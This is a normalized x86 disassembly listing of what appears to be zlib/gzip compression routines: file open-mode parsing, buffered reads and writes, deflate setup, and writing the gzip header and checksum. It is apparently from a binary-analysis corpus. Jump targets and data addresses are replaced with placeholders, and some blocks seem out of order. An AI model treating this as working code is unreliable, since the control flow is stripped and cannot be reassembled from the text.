mov [ esi + 0x5c ] 0x77
cmp al 0x61
jne r-xdata
cmp al 0x66
jne r-xdata
cmp al 0x39
jg r-xdata
mov al [ ecx ]
cmp al 0x30
jl r-xdata
cmp al 0x68
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
movsx edx al
sub edx 0x30
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp al 0x52
jne r-xdata
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
inc ecx
cmp al bl
mov [ ebp - 0x8 ] ecx
je r-xdata
mov edx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ edx ] al
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
mov al [ esi + 0x5c ]
cmp al bl
je r-xdata
lea eax [ ebp - 0xc ]
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp al 0x77
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x72
jne r-xdata
mov edi 0x4000
push edi
call [ malloc@IAT ]
push 0x38
push rw-data
push 0xfffffff1
push esi
mov [ esi + 0x44 ] eax
mov [ esi ] eax
call sub_1000b242
add esp 0x14
test eax eax
jne r-xdata
push 0x38
push rw-data
push [ ebp - 0x4 ]
push 0x8
push 0xfffffff1
push 0x8
push [ ebp - 0xc ]
push esi
call sub_10009abe
mov edi 0x4000
mov [ ebp + 0xc ] eax
push edi
call [ malloc@IAT ]
add esp 0x24
cmp [ ebp + 0xc ] ebx
mov [ esi + 0x48 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp [ esi + 0x44 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ esi + 0x10 ] edi
call [ _errno@IAT ]
cmp [ ebp + 0x10 ] ebx
mov [ eax ] ebx
lea eax [ ebp - 0x5c ]
push eax
jge r-xdata
push [ ebp + 0x10 ]
call [ _fdopen@IAT ]
push [ ebp + 0x8 ]
call [ fopen@IAT ]
jmp r-xdata
cmp [ esi + 0x5c ] 0x77
jne r-xdata
pop ecx
cmp eax ebx
pop ecx
mov [ esi + 0x40 ] eax
je r-xdata
push esi
call sub_1000968a
push [ esi + 0x40 ]
call [ ftell@IAT ]
sub eax [ esi + 0x4 ]
pop ecx
pop ecx
mov [ esi + 0x60 ] eax
push 0xb
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x8
push [ r--data ]
push [ r--data ]
push rw-data
push eax
call [ fprintf@IAT ]
add esp 0x30
mov [ esi + 0x60 ] 0xa
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax esi
jmp r-xdata
sub_1000968a
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push 0x1
mov edi [ esi + 0x4 ]
pop ebx
cmp edi 0x2
jae r-xdata
mov eax [ esi ]
movzx ecx [ eax ]
cmp ecx [ r--data ]
jne r-xdata
test edi edi
je r-xdata
mov [ esi + 0x58 ] ebx
movzx ecx [ eax + 0x1 ]
cmp ecx [ r--data ]
jne r-xdata
call [ _errno@IAT ]
and [ eax ] 0x0
push [ esi + 0x40 ]
mov eax 0x4000
mov ecx edi
sar eax cl
push eax
mov eax [ esi + 0x44 ]
add eax edi
push ebx
push eax
call [ fread@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ esi + 0x44 ]
mov al [ eax ]
mov [ ecx ] al
add [ esi + 0x4 ] 0xfffffffe
add eax 0x2
push esi
mov [ esi ] eax
call sub_100097da
push esi
mov edi eax
call sub_100097da
pop ecx
cmp edi 0x8
pop ecx
mov ebx eax
jne r-xdata
add [ esi + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x44 ]
cmp eax 0x2
mov [ esi ] ecx
jae r-xdata
mov ecx [ esi + 0x40 ]
test [ ecx + 0xc ] 0x20
je r-xdata
mov [ esi + 0x38 ] 0xfffffffd
jmp r-xdata
test bl 0xe0
jne r-xdata
mov [ esi + 0x58 ] eax
jmp r-xdata
or [ esi + 0x38 ] 0xffffffff
pop edi
pop esi
pop ebx
retn
push 0x6
pop edi
push esi
call sub_100097da
dec edi
pop ecx
jne r-xdata
test bl 0x4
je r-xdata
test bl 0x8
push esi
call sub_100097da
push esi
mov edi eax
call sub_100097da
pop ecx
shl eax 0x8
pop ecx
add edi eax
test bl 0x10
push esi
call sub_100097da
test eax eax
pop ecx
je r-xdata
push esi
call sub_100097da
cmp eax 0xffffffff
pop ecx
jne r-xdata
test bl 0x2
je r-xdata
push esi
call sub_100097da
test eax eax
pop ecx
je r-xdata
cmp eax 0xffffffff
jmp r-xdata
mov eax edi
dec edi
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
neg eax
sbb eax eax
and al 0xfd
mov [ esi + 0x38 ] eax
jmp r-xdata
push 0x2
pop edi
cmp eax 0xffffffff
jmp r-xdata
je r-xdata
push esi
call sub_100097da
dec edi
pop ecx
jne r-xdata
je r-xdata
sub_100097da
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x3c ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
or eax 0xffffffff
pop esi
retn
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
call [ _errno@IAT ]
and [ eax ] 0x0
push [ esi + 0x40 ]
push 0x4000
push 0x1
push [ esi + 0x44 ]
call [ fread@IAT ]
add esp 0x10
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x44 ]
mov [ esi ] eax
mov ecx [ esi + 0x40 ]
mov [ esi + 0x3c ] 0x1
or eax 0xffffffff
test [ ecx + 0xc ] 0x20
je r-xdata
pop esi
retn
mov [ esi + 0x38 ] eax
pop esi
retn
sub_10009840
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
test esi esi
jne r-xdata
mov eax [ esi + 0x50 ]
push edi
mov edi [ free@IAT ]
test eax eax
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
push eax
call edi
pop ecx
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov al [ esi + 0x5c ]
cmp al 0x77
jne r-xdata
mov eax [ esi + 0x38 ]
test eax eax
jge r-xdata
push eax
call [ fclose@IAT ]
test eax eax
pop ecx
je r-xdata
cmp al 0x72
jne r-xdata
push esi
call sub_1000a567
jmp r-xdata
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov ebx eax
call [ _errno@IAT ]
cmp [ eax ] 0x1d
je r-xdata
push esi
call sub_1000b2fb
pop ecx
mov ebx eax
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call edi
pop ecx
or ebx 0xffffffff
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call edi
pop ecx
push esi
call edi
pop ecx
mov eax ebx
pop edi
push eax
call edi
pop ecx
sub_100098dd
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
pop esi
retn
cmp [ esi + 0x5c ] 0x77
jne r-xdata
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x14 ]
push edi
test ebx ebx
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
je r-xdata
push ebx
push [ esp + 0x18 ]
push [ esi + 0x4c ]
call sub_1000b339
add esp 0xc
mov [ esi + 0x4c ] eax
mov eax ebx
sub eax [ esi + 0x4 ]
pop edi
pop ebx
pop esi
retn
mov edi 0x4000
mov eax [ esi + 0x4 ]
push 0x0
add [ esi + 0x64 ] eax
mov eax [ esi + 0x10 ]
add [ esi + 0x68 ] eax
push esi
call sub_10009d4f
mov edx [ esi + 0x10 ]
pop ecx
sub [ esi + 0x68 ] edx
pop ecx
mov ecx [ esi + 0x4 ]
mov [ esi + 0x38 ] eax
sub [ esi + 0x64 ] ecx
test eax eax
jne r-xdata
push [ esi + 0x40 ]
mov eax [ esi + 0x48 ]
mov [ esi + 0xc ] eax
push edi
push 0x1
push eax
call [ fwrite@IAT ]
add esp 0x10
cmp eax edi
jne r-xdata
test ecx ecx
jne r-xdata
or [ esi + 0x38 ] 0xffffffff
mov [ esi + 0x10 ] edi
cmp [ esi + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10009983
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
push 0xfffffffe
pop eax
cmp [ esi + 0x5c ] 0x77
jne r-xdata
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
push [ esi + 0x40 ]
push edi
push 0x1
push [ esi + 0x48 ]
call [ fwrite@IAT ]
add esp 0x10
cmp eax edi
jne r-xdata
mov esi [ esi + 0x38 ]
mov eax esi
dec eax
neg eax
sbb eax eax
and eax esi
jmp r-xdata
push [ esp + 0x14 ]
mov eax [ esi + 0x10 ]
add [ esi + 0x68 ] eax
push esi
call sub_10009d4f
pop ecx
mov [ esi + 0x38 ] eax
pop ecx
mov ecx [ esi + 0x10 ]
sub [ esi + 0x68 ] ecx
test edi edi
jne r-xdata
or eax 0xffffffff
mov [ esi + 0x38 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x10 ] 0x4000
mov [ esi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
test ecx ecx
jne r-xdata
cmp eax 0xfffffffb
jne r-xdata
push 0x1
pop ebx
cmp [ esi + 0x38 ] 0x1
je r-xdata
and [ esi + 0x38 ] edi
mov edi 0x4000
sub edi [ esi + 0x10 ]
je r-xdata
cmp eax 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
sub_10009a35
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
cmp [ esi + 0x5c ] 0x77
jne r-xdata
push 0xfffffffe
pop eax
pop esi
retn
push esi
call sub_10009840
pop ecx
pop esi
retn
push 0x4
push esi
call sub_10009983
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ esi + 0x4c ]
push [ esi + 0x40 ]
call sub_10009a79
push [ esi + 0x64 ]
push [ esi + 0x40 ]
call sub_10009a79
add esp 0x10
sub_10009a79
push esi
push 0x4
pop esi
mov eax [ esp + 0xc ]
push [ esp + 0x8 ]
and eax 0xff
push eax
call [ fputc@IAT ]
shr [ esp + 0x14 ] 0x8
pop ecx
dec esi
pop ecx
jne r-xdata
pop esi
retn
sub_10009abe
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push edi
xor ecx ecx
push 0x1
cmp eax ecx
pop ebx
je r-xdata
push 0xfffffffa
mov al [ eax ]
cmp al [ r--data ]
jne r-xdata
cmp [ ebp + 0x24 ] 0x38
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp edi ecx
je r-xdata
push 0xfffffffe
jmp r-xdata
cmp [ edi + 0x20 ] ecx
mov [ edi + 0x18 ] ecx
jne r-xdata
pop eax
cmp [ edi + 0x24 ] ecx
jne r-xdata
mov [ edi + 0x20 ] sub_1000b5c5
mov [ edi + 0x28 ] ecx
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov [ edi + 0x24 ] sub_1000b5d7
cmp [ ebp + 0x14 ] ecx
jge r-xdata
mov [ ebp + 0xc ] 0x6
cmp [ ebp + 0x14 ] 0xf
jle r-xdata
mov eax [ ebp + 0x14 ]
xor ebx ebx
neg eax
mov [ ebp + 0x14 ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] 0x1
jl r-xdata
sub [ ebp + 0x14 ] 0x10
push 0x2
pop ebx
push 0x9
pop eax
cmp [ ebp + 0x18 ] eax
jg r-xdata
cmp [ ebp + 0x10 ] 0x8
jne r-xdata
cmp [ ebp + 0x14 ] 0x8
jl r-xdata
cmp [ ebp + 0x14 ] 0xf
jg r-xdata
cmp [ ebp + 0xc ] ecx
jl r-xdata
cmp [ ebp + 0xc ] eax
jg r-xdata
cmp [ ebp + 0x1c ] ecx
jl r-xdata
cmp [ ebp + 0x1c ] 0x4
jg r-xdata
cmp [ ebp + 0x14 ] 0x8
jne r-xdata
push 0x16c0
push 0x1
push [ edi + 0x28 ]
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov [ ebp + 0x14 ] eax
push 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ edi + 0x1c ] esi
push 0x1
mov [ esi + 0x18 ] ebx
pop ebx
mov ecx eax
shl ebx cl
mov [ esi + 0x30 ] eax
push 0x1
and [ esi + 0x1c ] 0x0
xor edx edx
mov [ esi ] edi
mov [ esi + 0x2c ] ebx
lea eax [ ebx - 0x1 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp + 0x18 ]
lea ecx [ eax + 0x7 ]
pop eax
shl eax cl
push 0x3
mov [ esi + 0x50 ] ecx
mov [ esi + 0x4c ] eax
dec eax
mov [ esi + 0x54 ] eax
lea eax [ ecx + 0x2 ]
pop ecx
div ecx
push 0x2
push ebx
mov [ esi + 0x58 ] eax
push [ edi + 0x28 ]
call [ edi + 0x20 ]
push 0x2
mov [ esi + 0x38 ] eax
push [ esi + 0x2c ]
push [ edi + 0x28 ]
call [ edi + 0x20 ]
push 0x2
mov [ esi + 0x40 ] eax
push [ esi + 0x4c ]
push [ edi + 0x28 ]
call [ edi + 0x20 ]
mov [ esi + 0x44 ] eax
mov eax [ ebp + 0x18 ]
push 0x1
lea ebx [ esi + 0x169c ]
lea ecx [ eax + 0x6 ]
pop eax
shl eax cl
push 0x4
push eax
mov [ ebx ] eax
push [ edi + 0x28 ]
call [ edi + 0x20 ]
mov ecx [ ebx ]
add esp 0x30
mov edx ecx
mov [ esi + 0x8 ] eax
shl edx 0x2
mov [ esi + 0xc ] edx
xor edx edx
cmp [ esi + 0x38 ] edx
je r-xdata
mov [ esi + 0x4 ] 0x29a
mov eax [ r--data ]
push edi
mov [ edi + 0x18 ] eax
call sub_1000a567
pop ecx
cmp [ esi + 0x40 ] edx
je r-xdata
cmp [ esi + 0x44 ] edx
je r-xdata
cmp eax edx
je r-xdata
mov edx ecx
push edi
shr edx 0x1
mov [ esi + 0x24 ] 0x8
lea edx [ eax + edx * 2 ]
lea eax [ eax + ecx * 2 ]
add ecx eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x84 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x16a4 ] edx
mov [ esi + 0x1698 ] ecx
mov [ esi + 0x88 ] eax
call sub_10009cc6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10009cc6
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push 0xfffffffe
pop eax
mov esi [ edi + 0x1c ]
cmp esi ebx
je r-xdata
cmp [ edi + 0x20 ] ebx
je r-xdata
cmp [ edi + 0x24 ] ebx
je r-xdata
push 0x2
mov [ edi + 0x14 ] ebx
pop ecx
mov [ edi + 0x8 ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x2c ] ecx
mov eax [ esi + 0x8 ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] eax
mov eax [ esi + 0x18 ]
cmp eax ebx
jge r-xdata
mov eax [ esi + 0x18 ]
push ebx
mov edx eax
push ebx
neg edx
sbb edx edx
push ebx
and edx 0xffffffb9
add edx 0x71
cmp eax ecx
mov [ esi + 0x4 ] edx
jne r-xdata
neg eax
mov [ esi + 0x18 ] eax
call sub_1000b5e3
call sub_1000b339
jmp r-xdata
pop edi
pop esi
pop ebx
retn
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esi + 0x28 ] ebx
push esi
call sub_1000b810
push esi
call sub_1000a614
pop ecx
xor eax eax
pop ecx
jmp r-xdata
sub_10009d4f
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
cmp edi edx
je r-xdata
push 0xfffffffe
mov esi [ edi + 0x1c ]
cmp esi edx
je r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0x4
jg r-xdata
cmp ecx edx
jl r-xdata
cmp [ edi + 0xc ] edx
je r-xdata
mov eax [ r--data ]
mov [ edi + 0x18 ] eax
cmp [ edi ] edx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x29a
jne r-xdata
cmp [ edi + 0x4 ] edx
jne r-xdata
cmp [ edi + 0x10 ] edx
je r-xdata
cmp ecx 0x4
jne r-xdata
mov eax [ r--data ]
push 0xfffffffb
mov [ edi + 0x18 ] eax
jmp r-xdata
mov edx [ esi + 0x28 ]
cmp eax 0x2a
mov [ esi ] edi
mov [ ebp - 0x4 ] edx
mov [ esi + 0x28 ] ecx
jne r-xdata
pop eax
cmp [ esi + 0x4 ] 0x45
jne r-xdata
push 0x2
pop edx
cmp [ esi + 0x18 ] edx
jne r-xdata
cmp [ esi + 0x4 ] 0x49
jne r-xdata
mov ecx [ esi + 0x1c ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov ecx [ esi + 0x30 ]
shl ecx 0xc
sub ecx 0x7800
cmp [ esi + 0x88 ] edx
jge r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
call sub_1000b339
mov [ edi + 0x30 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x14 ]
add esp 0xc
mov [ eax + ecx ] 0x1f
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] 0x8b
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] 0x8
mov eax [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
cmp eax ebx
jne r-xdata
cmp [ esi + 0x4 ] 0x5b
jne r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x49
mov eax [ esi + 0x14 ]
mov [ ebp + 0x8 ] eax
mov eax [ ecx + 0x14 ]
and eax 0xffff
cmp [ esi + 0x20 ] eax
jae r-xdata
xor eax eax
mov eax [ esi + 0x84 ]
cmp eax edx
jl r-xdata
mov edx [ eax + 0x24 ]
neg edx
sbb dl dl
and edx 0x10
cmp [ eax + 0x2c ] 0x0
sete bl
dec ebx
and ebx 0x2
add dl bl
mov ebx [ eax + 0x1c ]
neg ebx
sbb bl bl
and ebx 0x8
add dl bl
mov ebx [ eax + 0x10 ]
neg ebx
sbb bl bl
and ebx 0x4
add dl bl
cmp [ eax ] 0x0
setne al
add dl al
mov eax [ esi + 0x8 ]
mov [ eax + ecx ] dl
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov cl [ ecx + 0x4 ]
mov [ edx + eax ] cl
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ ecx + 0x4 ]
mov edx [ esi + 0x8 ]
shr ecx 0x8
mov [ edx + eax ] cl
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ ecx + 0x4 ]
mov edx [ esi + 0x8 ]
shr ecx 0x10
mov [ edx + eax ] cl
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ ecx + 0x4 ]
mov edx [ esi + 0x8 ]
shr ecx 0x18
mov [ edx + eax ] cl
mov eax [ esi + 0x84 ]
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
cmp eax 0x9
jne r-xdata
mov eax [ esi + 0x8 ]
and [ eax + ecx ] bl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax ] bl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax ] bl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax ] bl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax ] bl
mov eax [ esi + 0x84 ]
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
cmp eax 0x9
jne r-xdata
cmp [ esi + 0x4 ] 0x67
jne r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x5b
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0xc ]
jne r-xdata
push 0x1f
mov eax ecx
xor edx edx
pop ebx
div ebx
mov [ esi + 0x4 ] 0x71
sub ecx edx
add ecx ebx
push ecx
push esi
call sub_1000a4ee
xor ebx ebx
pop ecx
cmp [ esi + 0x6c ] ebx
pop ecx
je r-xdata
or ecx 0x20
cmp eax 0x6
jge r-xdata
cmp [ esi + 0x88 ] 0x2
jge r-xdata
push 0x2
jmp r-xdata
cmp [ esi + 0x88 ] 0x2
jge r-xdata
push 0x2
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x67
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
mov ebx [ ebx + 0x1c ]
movzx ebx [ ebx + ecx ]
inc ecx
mov [ esi + 0x20 ] ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] bl
inc [ esi + 0x14 ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x1c ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
cmp ecx [ eax + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x20 ]
mov ebx [ esi + 0x8 ]
mov ecx [ ecx + 0x10 ]
mov cl [ ecx + edx ]
mov [ ebx + eax ] cl
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
inc [ esi + 0x20 ]
mov edx [ ecx + 0x14 ]
mov eax [ esi + 0x20 ]
and edx 0xffff
cmp eax edx
jb r-xdata
cmp [ ecx + 0x2c ] 0x0
je r-xdata
push ebx
push ebx
push ebx
call sub_1000b5e3
add esp 0xc
mov [ edi + 0x30 ] eax
mov eax [ edi + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_1000a4ee
mov eax [ edi + 0x30 ]
and eax 0xffff
push eax
push esi
call sub_1000a4ee
add esp 0x10
xor ebx ebx
cmp eax 0x6
setne bl
add ebx edx
mov eax ebx
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
push 0x4
cmp eax 0x2
jl r-xdata
pop eax
push 0x4
cmp eax 0x2
jl r-xdata
pop eax
cmp [ edi + 0x4 ] ebx
jne r-xdata
push edi
call sub_1000a518
cmp [ edi + 0x10 ] ebx
pop ecx
jne r-xdata
mov [ esi + 0x4 ] 0x71
mov eax [ esi + 0x14 ]
inc eax
inc eax
cmp eax [ esi + 0xc ]
jbe r-xdata
mov ebx [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
mov ebx [ ebx + 0x24 ]
movzx ebx [ ebx + ecx ]
inc ecx
mov [ esi + 0x20 ] ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] bl
inc [ esi + 0x14 ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x1c ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
jmp r-xdata
push edi
call sub_1000a518
mov eax [ esi + 0x14 ]
pop ecx
cmp eax [ esi + 0xc ]
mov edx eax
je r-xdata
cmp eax edx
jbe r-xdata
and [ esi + 0x20 ] 0x0
sub eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
add eax [ ebp + 0x8 ]
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
push edi
call sub_1000a518
mov eax [ esi + 0x14 ]
pop ecx
cmp eax [ esi + 0xc ]
mov [ ebp + 0x8 ] eax
je r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
shl eax 0x6
or ecx eax
cmp [ esi + 0x6c ] 0x0
je r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + 0x2c ] ebx
je r-xdata
mov edx [ esi + 0x8 ]
mov al [ eax + 0x14 ]
mov [ edx + ecx ] al
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ ecx + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x8
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ebx 0x29a
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
jmp r-xdata
mov eax [ esi + 0x14 ]
lea ecx [ eax + 0x2 ]
cmp ecx [ esi + 0xc ]
ja r-xdata
push edi
call sub_1000a518
pop ecx
mov eax [ esi + 0x1c ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
jmp r-xdata
push edi
call sub_1000a518
mov eax [ esi + 0x14 ]
pop ecx
cmp eax [ esi + 0xc ]
mov edx eax
je r-xdata
cmp eax edx
jbe r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax edx
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0xc ]
jne r-xdata
push 0x1
pop ebx
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
sub eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
add eax [ ebp + 0x8 ]
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esi + 0x20 ] ebx
mov [ esi + 0x4 ] 0x45
jmp r-xdata
push ecx
push [ esi + 0x8 ]
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
mov edx [ esi + 0x8 ]
xor ebx ebx
mov [ edx + ecx ] al
mov ecx [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov cl [ ecx + 0xc ]
mov [ edx + eax ] cl
mov eax [ esi + 0x1c ]
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
cmp [ eax + 0x10 ] ebx
je r-xdata
mov edx [ esi + 0x8 ]
mov [ edx + ecx ] al
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] 0xb
inc [ esi + 0x14 ]
mov [ esi + 0x4 ] 0x71
jmp r-xdata
xor ecx ecx
cmp [ edi + 0x4 ] ecx
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp eax 0x4
jne r-xdata
or [ esi + 0x28 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov dl [ edi + 0x30 ]
mov [ ecx + eax ] dl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x30 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x8
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
xor eax eax
push eax
push eax
push eax
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax edx
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0xc ]
jne r-xdata
push 0x1
pop ebx
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
and [ esi + 0x20 ] ebx
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
mov eax [ esi + 0x84 ]
push [ ebp + 0xc ]
lea eax [ eax + eax * 2 ]
push esi
call [ eax * 4 + r--data ]
pop ecx
cmp eax 0x2
pop ecx
je r-xdata
cmp [ esi + 0x74 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push [ edi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esi + 0x4 ] ebx
cmp eax 0x3
jne r-xdata
cmp [ ebp + 0xc ] ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ edi + 0x10 ] 0x0
jne r-xdata
cmp eax 0x2
je r-xdata
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
cmp eax ebx
je r-xdata
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jg r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x1
jmp r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push esi
call sub_1000b8df
add esp 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
push esi
call sub_1000b974
pop ecx
